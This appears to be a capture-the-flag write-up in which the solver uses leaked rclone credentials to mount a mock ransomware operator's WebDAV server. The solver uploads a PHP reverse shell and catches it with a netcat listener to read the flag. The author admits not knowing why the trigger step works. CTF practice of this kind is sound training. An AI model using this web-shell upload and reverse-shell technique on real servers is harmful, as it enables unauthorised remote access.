
# operation eradication

## instrucations
Oh no! A ransomware operator encrypted an environment, and exfiltrated data that they will soon use for blackmail and extortion if they don't receive payment! They stole our data!

Luckily, we found what looks like a configuration file, that seems to have credentials to the actor's storage server... but it doesn't seem to work. Can you get onto their server and delete all the data they stole!?

with that you get some credentials:
type = webdav
url = http://localhost/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5

## how to solve

1. the credentials are for rclone 

```bash
# get the path to rclone config 
rclone config file  
# replace it with given credentials, replace url with given one i.e. http://chal.ctf.games:30337/webdav

# to mount the remote webdav directory:
rclone mount DEFAULT:/ ./mount-dir/  

# download reverse shell from: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
# modify ip and port
# copy php reverse shell in webdav directory

# on server start listening for reverse shell
nc -v -n -l -p 1234

# now execute the php reverse shell with cat
# idk why this works but it worked
cat php-reverse-shell.php

# now on the server with netcat a shell should pop up
# the flag is in /var/www/html/index.php
```